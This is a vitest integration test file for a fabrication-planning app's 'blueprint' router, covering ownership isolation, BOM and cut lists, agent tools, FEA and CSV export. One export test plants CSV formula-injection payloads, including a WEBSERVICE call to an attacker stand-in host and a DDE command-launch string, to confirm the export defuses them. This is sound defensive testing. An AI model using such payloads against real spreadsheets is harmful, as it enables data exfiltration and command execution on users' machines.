/**
 * Route-level integration tests for `blueprintRouter`.
 *
 * Real in-memory libSQL via the shared trpcHarness (actual schema +
 * migrations, FK cascade on), driven through `appRouter.createCaller`. Focus:
 * per-user ownership isolation across every plan-scoped endpoint, CRUD
 * round-trips, cascade deletion of child rows, the materials catalog surface,
 * and the agent-toolset persistence helpers (plan snapshot + tools writing
 * BOM/cut/sim rows against the same DB).
 */
import { describe, it, expect, beforeEach, vi } from "vitest";
import { TRPCError } from "@trpc/server";

const h = vi.hoisted(() => ({ db: null as unknown }));

vi.mock("../db.factory.js", async (importActual) => {
  const actual = await importActual<typeof import("../db.factory.js")>();
  return { ...actual, getDb: async () => h.db };
});

vi.mock("../core_services/services/AuditLogService.js", () => ({
  AuditLogService: {
    getInstance: () => ({ log: vi.fn().mockResolvedValue(undefined) }),
  },
}));

// FEA is mocked (no python spawn); the CAD service stays real so compile_cad
// produces a genuine STL for run_fea to resolve.
const feaMock = vi.hoisted(() => ({ checkAvailability: vi.fn(), run: vi.fn() }));
vi.mock("../core_services/blueprint/BlueprintFeaService.js", () => ({
  BlueprintFeaService: { getInstance: () => feaMock },
}));

import { appRouter } from "../routers.js";
import { blueprintBomItems, blueprintCutItems, blueprintMessages, blueprintPlans } from "../../drizzle/schema.js";
import { eq } from "drizzle-orm";
import { createTestDb, seedUser, makeContext, type TestDb } from "./_helpers/trpcHarness.js";
import type { Db } from "../db.js";
import { buildBlueprintTools, loadPlanSnapshot, buildBlueprintSystemPrompt } from "../core_services/blueprint/blueprintAgentTools.js";

type Caller = ReturnType<typeof appRouter.createCaller>;

let store: TestDb;
let db: Db;
let alice: Awaited<ReturnType<typeof seedUser>>;
let bob: Awaited<ReturnType<typeof seedUser>>;
let asAlice: Caller;
let asBob: Caller;

beforeEach(async () => {
  store = await createTestDb();
  db = store.db;
  h.db = db;
  alice = await seedUser(db, { name: "Alice" });
  bob = await seedUser(db, { name: "Bob", email: "bob@example.com" });
  asAlice = appRouter.createCaller(makeContext(alice, db));
  asBob = appRouter.createCaller(makeContext(bob, db));
});

async function createPlan(caller: Caller, overrides: Record<string, unknown> = {}) {
  const res = await caller.blueprint.create({
    title: "Welding table",
    brief: "4x2 ft steel welding table, 500 lb capacity",
    category: "metal_fab",
    units: "imperial",
    cadEngine: "jscad",
    ...overrides,
  } as never);
  return res.id;
}

describe("plan CRUD + ownership", () => {
  it("creates, lists, gets, updates and deletes a plan", async () => {
    const id = await createPlan(asAlice);
    const list = await asAlice.blueprint.list({});
    expect(list.map((p) => p.id)).toContain(id);

    const got = await asAlice.blueprint.get({ planId: id });
    expect(got.plan.title).toBe("Welding table");
    expect(got.plan.status).toBe("draft");
    expect(got.bomItems).toHaveLength(0);

    await asAlice.blueprint.update({ planId: id, status: "planning", overview: "## Design\nSteel frame." });
    const updated = await asAlice.blueprint.get({ planId: id });
    expect(updated.plan.status).toBe("planning");
    expect(updated.plan.overview).toContain("Steel frame");

    await asAlice.blueprint.delete({ planId: id });
    expect((await asAlice.blueprint.list({})).find((p) => p.id === id)).toBeUndefined();
  });

  it("never exposes another user's plan through any endpoint", async () => {
    const id = await createPlan(asAlice);
    await expect(asBob.blueprint.get({ planId: id })).rejects.toThrow(TRPCError);
    await expect(asBob.blueprint.update({ planId: id, title: "hijack" })).rejects.toThrow(TRPCError);
    await expect(asBob.blueprint.delete({ planId: id })).rejects.toThrow(TRPCError);
    await expect(asBob.blueprint.listMessages({ planId: id })).rejects.toThrow(TRPCError);
    await expect(
      asBob.blueprint.upsertBomItem({ planId: id, name: "x", kind: "material", spec: "", quantity: 1, unit: "pcs" }),
    ).rejects.toThrow(TRPCError);
    expect((await asBob.blueprint.list({})).find((p) => p.id === id)).toBeUndefined();
  });

  it("filters by mapId when provided", async () => {
    await createPlan(asAlice, { title: "No map" });
    const withMap = await createPlan(asAlice, { title: "Mapped", mapId: undefined });
    void withMap;
    const all = await asAlice.blueprint.list({});
    expect(all.length).toBe(2);
  });

  it("cascades child rows on plan delete", async () => {
    const id = await createPlan(asAlice);
    await asAlice.blueprint.upsertBomItem({ planId: id, name: "Tube", kind: "material", spec: "2x2", quantity: 4, unit: "pcs" });
    await asAlice.blueprint.upsertCutItem({ planId: id, partLabel: "Leg", stockName: "2x2 tube", quantity: 4, lengthMm: 850 });
    await asAlice.blueprint.appendMessage({ planId: id, role: "user", content: "hello" });
    await asAlice.blueprint.delete({ planId: id });

    expect(await db.select().from(blueprintBomItems).where(eq(blueprintBomItems.planId, id))).toHaveLength(0);
    expect(await db.select().from(blueprintCutItems).where(eq(blueprintCutItems.planId, id))).toHaveLength(0);
    expect(await db.select().from(blueprintMessages).where(eq(blueprintMessages.planId, id))).toHaveLength(0);
  });
});

describe("BOM + cut list editing", () => {
  it("upserts and deletes BOM rows", async () => {
    const id = await createPlan(asAlice);
    const { id: itemId } = await asAlice.blueprint.upsertBomItem({
      planId: id,
      name: "2×2 square tube",
      kind: "material",
      spec: "0.120 wall, 24 ft",
      quantity: 2,
      unit: "pcs",
      unitCost: 130,
    });
    let got = await asAlice.blueprint.get({ planId: id });
    expect(got.bomItems).toHaveLength(1);
    expect(got.bomItems[0].unitCost).toBe(130);

    await asAlice.blueprint.upsertBomItem({ planId: id, id: itemId, name: "2×2 square tube", kind: "material", spec: "0.120 wall, 24 ft", quantity: 3, unit: "pcs", unitCost: 125 });
    got = await asAlice.blueprint.get({ planId: id });
    expect(got.bomItems[0].quantity).toBe(3);

    await asAlice.blueprint.deleteBomItem({ planId: id, id: itemId });
    got = await asAlice.blueprint.get({ planId: id });
    expect(got.bomItems).toHaveLength(0);
  });

  it("stores cut-list geometry (mm + angles) faithfully", async () => {
    const id = await createPlan(asAlice);
    await asAlice.blueprint.upsertCutItem({
      planId: id,
      partLabel: "Rafter A",
      stockName: "2×6 SPF 12 ft",
      quantity: 6,
      lengthMm: 3162.3,
      miter1Deg: 18.4,
      miter2Deg: 18.4,
      notes: "plumb cuts both ends",
    });
    const got = await asAlice.blueprint.get({ planId: id });
    expect(got.cutItems[0].lengthMm).toBeCloseTo(3162.3, 3);
    expect(got.cutItems[0].miter1Deg).toBeCloseTo(18.4, 3);
  });
});

describe("conversation persistence", () => {
  it("appends and lists messages in order with blocks", async () => {
    const id = await createPlan(asAlice);
    await asAlice.blueprint.appendMessage({ planId: id, role: "user", content: "Design me a table" });
    await asAlice.blueprint.appendMessage({
      planId: id,
      role: "assistant",
      content: "Here's the plan",
      blocks: [{ id: "b1", type: "text", text: "Here's the plan" }],
      tokenCount: 42,
    });
    const messages = await asAlice.blueprint.listMessages({ planId: id });
    expect(messages).toHaveLength(2);
    expect(messages[0].role).toBe("user");
    expect(messages[1].tokenCount).toBe(42);
    expect((messages[1].blocks as { type: string }[])[0].type).toBe("text");
  });
});

describe("materials catalog surface", () => {
  it("lists categories and searches with real properties", async () => {
    const categories = await asAlice.blueprint.materials.categories();
    expect(categories).toContain("lumber");
    expect(categories).toContain("filament");

    const results = await asAlice.blueprint.materials.search({ query: "square tube frame", limit: 10 });
    expect(results.length).toBeGreaterThan(0);
    const tube = results.find((m) => m.key.startsWith("steel.sq_tube"));
    expect(tube).toBeDefined();
    expect(tube!.yieldStrengthMPa).toBeGreaterThan(200);
    expect(tube!.elasticModulusMPa).toBe(200000);
  });
});

describe("agent toolset against the real DB", () => {
  it("update_plan / set_bom / set_cut_list / engineering_calc persist and snapshot", async () => {
    const id = await createPlan(asAlice);
    const tools = buildBlueprintTools({ planId: id, userId: alice.id, executionMode: "scrapper" });
    const byName = new Map(tools.map((t) => [t.definition.name, t]));

    await byName.get("update_plan")!.execute({
      overview: "## Welding table\nSteel frame, plate top.",
      status: "planning",
      assemblySteps: [{ title: "Cut legs", detail: "Cut 4 legs to length.", parts: ["Leg"], tools: ["chop saw"] }],
    });
    await byName.get("set_bom")!.execute({
      items: [
        { name: "2×2 square tube", materialKey: "steel.sq_tube_2x2_120", spec: "0.120 wall", quantity: 2, unit: "pcs", unitCost: 130 },
        { name: "M10 bolts", kind: "hardware", quantity: 16, unit: "pcs", unitCost: 0.6 },
      ],
    });
    await byName.get("set_cut_list")!.execute({
      items: [{ partLabel: "Leg", stockName: "2×2 tube", quantity: 4, lengthMm: 850 }],
    });
    const calcResult = await byName.get("engineering_calc")!.execute({
      calc: "beam_bending",
      params: {
        spanMm: 1200,
        support: "simple",
        pointLoadKg: 230,
        section: { shape: "rect_tube", widthMm: 50.8, depthMm: 50.8, wallMm: 3.05 },
        materialKey: "steel.sq_tube_2x2_120",
      },
      name: "Top rail @ 230 kg midspan",
    });
    const parsed = JSON.parse(calcResult);
    expect(parsed.pass).toBe(true);
    expect(parsed.safetyFactor).toBeGreaterThan(1.67);

    const snapshot = await loadPlanSnapshot(id, alice.id);
    expect(snapshot.plan.status).toBe("planning");
    expect(snapshot.bomItems).toHaveLength(2);
    expect(snapshot.cutItems).toHaveLength(1);
    expect(snapshot.simResults).toHaveLength(1);
    expect(snapshot.simResults[0].kind).toBe("calc");

    const prompt = buildBlueprintSystemPrompt(snapshot, { sovereign: false, feaAvailable: false, openscadAvailable: false });
    expect(prompt).toContain("Welding table");
    expect(prompt).toContain("2×2 square tube ×2 pcs");
    expect(prompt).toContain("Top rail @ 230 kg midspan");
    expect(prompt).toContain("NEVER do structural/load math in your head");
  });

  it("refuses tool writes against a plan the user doesn't own", async () => {
    const id = await createPlan(asAlice);
    const bobTools = buildBlueprintTools({ planId: id, userId: bob.id, executionMode: "scrapper" });
    const update = bobTools.find((t) => t.definition.name === "update_plan")!;
    await expect(update.execute({ overview: "hijacked" })).rejects.toThrow(/not found/i);
    const [row] = await db.select().from(blueprintPlans).where(eq(blueprintPlans.id, id));
    expect(row.overview).toBe("");
  });

  it("omits the web-search tool for sovereign users", () => {
    const cloud = buildBlueprintTools({ planId: "x", userId: alice.id, executionMode: "scrapper" });
    const air = buildBlueprintTools({ planId: "x", userId: alice.id, executionMode: "sovereign" });
    expect(cloud.some((t) => t.definition.name === "search_materials_web")).toBe(true);
    expect(air.some((t) => t.definition.name === "search_materials_web")).toBe(false);
  });

  it("optimize_cuts computes buy quantities without touching the DB", async () => {
    const id = await createPlan(asAlice);
    const tools = buildBlueprintTools({ planId: id, userId: alice.id, executionMode: "scrapper" });
    const result = await tools.find((t) => t.definition.name === "optimize_cuts")!.execute({
      mode: "1d",
      parts: [{ label: "leg", lengthMm: 850, quantity: 4 }],
      stockLengthMm: 7315, // 24 ft stick
      kerfMm: 2,
    });
    const parsed = JSON.parse(result);
    expect(parsed.sticksNeeded).toBe(1);
    expect(parsed.unplaced).toHaveLength(0);
  });

  it("optimize_cuts writeToBom upserts the buy-quantity onto the BOM + records provenance", async () => {
    const id = await createPlan(asAlice);
    const optimize = buildBlueprintTools({ planId: id, userId: alice.id, executionMode: "scrapper" }).find(
      (t) => t.definition.name === "optimize_cuts",
    )!;

    // 4 × 850 mm legs from 7315 mm sticks → 1 stick, written to the BOM.
    const r1 = JSON.parse(
      await optimize.execute({
        mode: "1d",
        parts: [{ label: "leg", lengthMm: 850, quantity: 4 }],
        stockLengthMm: 7315,
        writeToBom: { materialKey: "steel.sq_tube_2x2_120", name: "2×2 square tube", unit: "stick", unitCost: 130 },
      }),
    );
    expect(r1.bomWrite.quantity).toBe(1);
    expect(r1.bomWrite.updated).toBe(false);

    let snap = await loadPlanSnapshot(id, alice.id);
    expect(snap.bomItems).toHaveLength(1);
    expect(snap.bomItems[0].materialKey).toBe("steel.sq_tube_2x2_120");
    expect(snap.bomItems[0].quantity).toBe(1);
    expect(snap.bomItems[0].unit).toBe("stick");
    // The nesting run is saved for provenance.
    expect(snap.simResults.some((s) => s.name.startsWith("Cut optimization"))).toBe(true);

    // Re-run with more legs → the SAME BOM line is updated in place, not duplicated.
    const r2 = JSON.parse(
      await optimize.execute({
        mode: "1d",
        parts: [{ label: "leg", lengthMm: 850, quantity: 20 }],
        stockLengthMm: 7315,
        writeToBom: { materialKey: "steel.sq_tube_2x2_120", name: "2×2 square tube" },
      }),
    );
    expect(r2.bomWrite.updated).toBe(true);
    snap = await loadPlanSnapshot(id, alice.id);
    expect(snap.bomItems).toHaveLength(1); // upsert, not append
    expect(snap.bomItems[0].quantity).toBe(3); // 20 legs → 3 sticks
  });

  it("list_materials returns catalog keys usable by the calc tool", async () => {
    const id = await createPlan(asAlice);
    const tools = buildBlueprintTools({ planId: id, userId: alice.id, executionMode: "scrapper" });
    const result = await tools.find((t) => t.definition.name === "list_materials")!.execute({ query: "2x4 framing stud" });
    const parsed = JSON.parse(result) as { key: string; E_MPa?: number }[];
    expect(parsed.some((m) => m.key === "lumber.spf_2x4")).toBe(true);
  });

  it("compile_cad supersedes a part's prior files (revision lineage)", async () => {
    const id = await createPlan(asAlice);
    const compile = buildBlueprintTools({ planId: id, userId: alice.id, executionMode: "scrapper" }).find(
      (t) => t.definition.name === "compile_cad",
    )!;
    const code = "const { cuboid } = jscad.primitives; function main() { return cuboid({ size: [10, 10, 10] }); }";
    await compile.execute({ code, partName: "block" });
    await compile.execute({ code, partName: "block" }); // recompile the same part

    const snap = await loadPlanSnapshot(id, alice.id);
    const meshes = snap.files.filter((f) => f.kind === "mesh_json" && f.name === "block.mesh.json");
    expect(meshes).toHaveLength(2);
    const latest = meshes.filter((f) => f.isLatest);
    expect(latest).toHaveLength(1); // exactly one current version
    expect(latest[0].version).toBe(2);
    const old = meshes.find((f) => !f.isLatest)!;
    expect(old.version).toBe(1);
    expect(latest[0].supersedesId).toBe(old.id); // lineage points back
  });

  it("run_fea records a running row, solves decoupled from the stream signal, then completes it", async () => {
    const id = await createPlan(asAlice);
    const tools = buildBlueprintTools({ planId: id, userId: alice.id, executionMode: "scrapper" });
    // A real compiled STL for the FEA to analyze.
    await tools.find((t) => t.definition.name === "compile_cad")!.execute({
      code: "const { cuboid } = jscad.primitives; function main() { return cuboid({ size: [20, 20, 20] }); }",
      partName: "bracket",
    });

    feaMock.checkAvailability.mockResolvedValue({ available: true });
    let resolveRun!: (v: unknown) => void;
    feaMock.run.mockReturnValue(new Promise((r) => { resolveRun = r; }));

    const call = tools.find((t) => t.definition.name === "run_fea")!.execute({
      materialKey: "steel.sq_tube_2x2_120",
      fixture: { kind: "min_z" },
      load: { region: { kind: "max_z" }, forceN: [0, 0, -1000] },
    });

    // Mid-solve: a "running" row exists, and fea.run was called with the
    // request ONLY (no ctx.signal) — proving the solve is decoupled from the
    // chat stream so a disconnect can't kill it.
    await new Promise((r) => setTimeout(r, 15));
    let snap = await loadPlanSnapshot(id, alice.id);
    expect(snap.simResults.find((s) => s.kind === "fea")?.status).toBe("running");
    expect(feaMock.run).toHaveBeenCalledTimes(1);
    expect(feaMock.run.mock.calls[0]).toHaveLength(1);

    resolveRun({ summary: { status: "completed", maxVonMisesMPa: 12.3, safetyFactor: 4.2 }, fieldJson: Buffer.from("{}"), log: "" });
    const result = JSON.parse(await call);
    expect(result.status).toBe("completed");

    snap = await loadPlanSnapshot(id, alice.id);
    const done = snap.simResults.find((s) => s.kind === "fea");
    expect(done?.status).toBe("completed");
    expect((done?.results as { maxVonMisesMPa?: number }).maxVonMisesMPa).toBe(12.3);
    expect(snap.files.some((f) => f.kind === "fea_result")).toBe(true);
  });
});

describe("shopping export", () => {
  it("exportBom returns a CSV + supplier-grouped buy-list + known-price total, ownership-scoped", async () => {
    const id = await createPlan(asAlice);
    await asAlice.blueprint.upsertBomItem({ planId: id, name: "2×2 tube, 24 ft", kind: "material", spec: "0.120 wall", quantity: 2, unit: "stick", unitCost: 130, supplier: "Metal Supermarket" });
    await asAlice.blueprint.upsertBomItem({ planId: id, name: 'Caster, "swivel", 3in', kind: "hardware", spec: "", quantity: 4, unit: "pcs", unitCost: 5.5, supplier: "Amazon" });
    await asAlice.blueprint.upsertBomItem({ planId: id, name: "Weld wire", kind: "consumable", spec: "", quantity: 1, unit: "spool" }); // unpriced

    const exp = await asAlice.blueprint.exportBom({ planId: id });
    expect(exp.itemCount).toBe(3);
    expect(exp.totalUsd).toBe(2 * 130 + 4 * 5.5); // 282 — the unpriced line is excluded

    // CSV: header + 3 rows; the comma/quote in the caster name is RFC-4180 escaped.
    const rows = exp.csv.trim().split("\r\n");
    expect(rows).toHaveLength(4);
    expect(rows[0]).toContain("Unit Cost (USD)");
    expect(exp.csv).toContain('"Caster, ""swivel"", 3in"');

    // Buy-list groups by supplier, unpriced items under "Unspecified supplier".
    expect(exp.buyList).toContain("Metal Supermarket:");
    expect(exp.buyList).toContain("Unspecified supplier:");
    expect(exp.buyList).toContain("TOTAL");

    await expect(asBob.blueprint.exportBom({ planId: id })).rejects.toThrow(TRPCError);
  });

  it("exportBom neutralizes CSV formula-injection payloads (CWE-1236)", async () => {
    const id = await createPlan(asAlice);
    // A crafted field beginning with a formula-trigger char must not survive raw.
    await asAlice.blueprint.upsertBomItem({
      planId: id,
      name: "=WEBSERVICE(\"http://evil.example/x\")",
      kind: "material",
      spec: "",
      quantity: 1,
      unit: "pcs",
      supplier: "+cmd|'/c calc'!A0",
      notes: "@SUM(1+1)",
    });

    const exp = await asAlice.blueprint.exportBom({ planId: id });
    // Every trigger char is defused with a leading apostrophe; the live formula
    // form (a cell literally starting with "=", "+", or "@") never appears.
    expect(exp.csv).not.toMatch(/(^|,)=WEBSERVICE/);
    expect(exp.csv).toContain("'=WEBSERVICE");
    expect(exp.csv).toContain("'+cmd");
    expect(exp.csv).toContain("'@SUM");
  });
});

describe("geometry import", () => {
  it("ingests an STL as a full part (mesh + stl + drawings), flagged imported", async () => {
    const id = await createPlan(asAlice);
    const ascii = "solid t\nfacet normal 0 0 1\nouter loop\nvertex 0 0 0\nvertex 10 0 0\nvertex 0 10 0\nendloop\nendfacet\nendsolid t";
    const res = await asAlice.blueprint.importGeometry({ planId: id, name: "widget.stl", format: "stl", contentBase64: Buffer.from(ascii).toString("base64") });
    expect(res.format).toBe("stl");
    expect(res.part.name).toBe("widget");

    const snap = await loadPlanSnapshot(id, alice.id);
    const kinds = new Set(snap.files.map((f) => f.kind));
    expect(kinds.has("mesh_json")).toBe(true);
    expect(kinds.has("stl")).toBe(true); // ← makes it usable by run_fea
    expect(kinds.has("drawing_svg")).toBe(true);
    expect(kinds.has("drawing_dxf")).toBe(true);
    expect((snap.files.find((f) => f.kind === "mesh_json")!.meta as { imported?: boolean }).imported).toBe(true);
  });

  it("parses a DXF outline (LWPOLYLINE) into a drawing", async () => {
    const id = await createPlan(asAlice);
    const dxf = "0\nSECTION\n2\nENTITIES\n0\nLWPOLYLINE\n70\n1\n10\n0\n20\n0\n10\n100\n20\n0\n10\n100\n20\n50\n10\n0\n20\n50\n0\nENDSEC\n0\nEOF\n";
    const res = await asAlice.blueprint.importGeometry({ planId: id, name: "panel.dxf", format: "dxf", contentBase64: Buffer.from(dxf).toString("base64") });
    expect(res.format).toBe("dxf");
    expect(res.part.edges).toBe(4); // closed 4-sided outline

    const snap = await loadPlanSnapshot(id, alice.id);
    expect(snap.files.some((f) => f.kind === "drawing_svg")).toBe(true);
    expect(snap.files.some((f) => f.kind === "drawing_dxf")).toBe(true);
  });

  it("rejects an empty DXF and a plan the caller doesn't own", async () => {
    const id = await createPlan(asAlice);
    await expect(
      asAlice.blueprint.importGeometry({ planId: id, name: "empty.dxf", format: "dxf", contentBase64: Buffer.from("0\nSECTION\n2\nHEADER\n0\nENDSEC\n0\nEOF\n").toString("base64") }),
    ).rejects.toThrow(/No LINE\/LWPOLYLINE/);
    await expect(
      asBob.blueprint.importGeometry({ planId: id, name: "x.stl", format: "stl", contentBase64: Buffer.from("solid x\nendsolid x").toString("base64") }),
    ).rejects.toThrow(TRPCError);
  });
});
